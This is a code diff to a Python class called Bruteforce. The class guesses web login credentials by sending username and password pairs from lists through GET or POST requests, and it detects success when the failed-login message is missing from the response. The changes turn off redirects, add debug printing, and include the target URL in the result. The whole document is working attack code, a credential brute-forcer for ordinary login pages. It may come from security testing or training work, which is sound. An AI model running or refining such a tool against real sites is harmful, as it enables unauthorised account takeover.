@@ -23,7 +23,7 @@ class Bruteforce:
     
     def get_request(self, user_from_list, password_from_list):
         formatted_url = f"{self.url}?{self.payload_info['login_name']}={user_from_list}&{self.payload_info['password_name']}={password_from_list}&{self.payload_info['submit_name']}={self.payload_info['submit_value']}"
-        return requests.get(formatted_url, headers=self.headers, allow_redirects=True, cookies=self.cookies)
+        return requests.get(formatted_url, headers=self.headers, allow_redirects=False, cookies=self.cookies)
         
     def post_request(self, user_from_list, password_from_list):
         payload = {
@@ -32,9 +32,10 @@ class Bruteforce:
             self.payload_info["submit_name"] : self.payload_info["submit_value"]
         }
         print(payload)
-        return requests.post(self.url, headers=self.headers, data=payload, allow_redirects=True, cookies=self.cookies)
+        return requests.post(self.url, headers=self.headers, data=payload, allow_redirects=False, cookies=self.cookies)
     
     def run(self):
+        print("failed message")
         print(self.find_failed_message())
         failed_message = self.find_failed_message()[0]
         print(f"Failed message: {failed_message}")
@@ -52,19 +53,22 @@ class Bruteforce:
                     response = self.get_request(user, password)
                     if failed_message.replace(" ", "") not in response.text.replace(" ", ""):
                         print(f"Found user: {user} and password: {password}")
-                        return {"user": user, "password": password}
+                        return {"user": user, "password": password, "url": self.url}
                 elif self.method.lower() == "post":
                     response = self.post_request(user, password)
                     if failed_message.replace(" ", "") not in response.text.replace(" ", ""):
                         print(f"Found user: {user} and password: {password}")
-                        return {"user": user, "password": password}
+                        return {"user": user, "password": password, "url": self.url }
 
-        return {"user": None, "password": None}
+        return {"user": None, "password": None , "url": self.url}
 
     def get_added_content(self, old_html, new_html):
         # Parse the HTML content
         soup_old = BeautifulSoup(old_html, 'html.parser')
         soup_new = BeautifulSoup(new_html, 'html.parser')
+        print(f"Old html: {soup_old}")
+        print(f"New html: {soup_new}")
+
 
         # Get the string representations of the parsed HTML
         str_old = str(soup_old)
@@ -76,12 +80,13 @@ class Bruteforce:
         added_lines = [line[1:] for line in diff if line.startswith('+') and not line.startswith('+++')]
 
         # Return the added content as a string
+        print(f"Added lines: {added_lines}")
         return added_lines
 
     
     def find_failed_message(self):
         # make a get request on login page
-        response = requests.get(self.url, cookies=self.cookies)
+        response = requests.get(self.url, cookies=self.cookies, allow_redirects=False)
         # make a request with a wrong password
         print(self.method)
         if self.method.lower() == "get":
